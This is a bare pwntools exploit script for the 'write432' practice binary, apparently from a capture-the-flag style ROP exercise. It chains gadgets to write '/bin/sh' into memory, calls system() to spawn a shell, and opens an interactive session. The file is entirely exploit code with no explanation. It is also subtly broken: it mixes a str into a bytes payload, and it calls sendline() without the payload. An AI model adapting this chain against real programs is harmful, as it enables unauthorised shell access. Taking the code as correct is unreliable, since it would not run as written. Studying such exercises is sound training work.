#!/bin/python

from pwn import *

pop_edi_pop_ebp = p32(0x080486da)
binstring = b"/bin"
gotplt = p32(0x0804a040)
shstring = b"/sh\x00"
gotplt2 = p32(0x0804a040 + 0x4)
mov_ebp_to_edi = p32(0x08048670)
sysfunc = p32(0x8048430)

payload = b"A"*44
payload += pop_edi_pop_ebp
payload += gotplt
payload += binstring
payload += mov_ebp_to_edi
payload += pop_edi_pop_ebp
payload += gotplt2
payload += shstring
payload += mov_ebp_to_edi
payload += sysfunc
payload += 'junk'
payload += gotplt

#print(payload)

io = process("./write432")
io.recvrepeat(2)
io.sendline()
io.interactive()
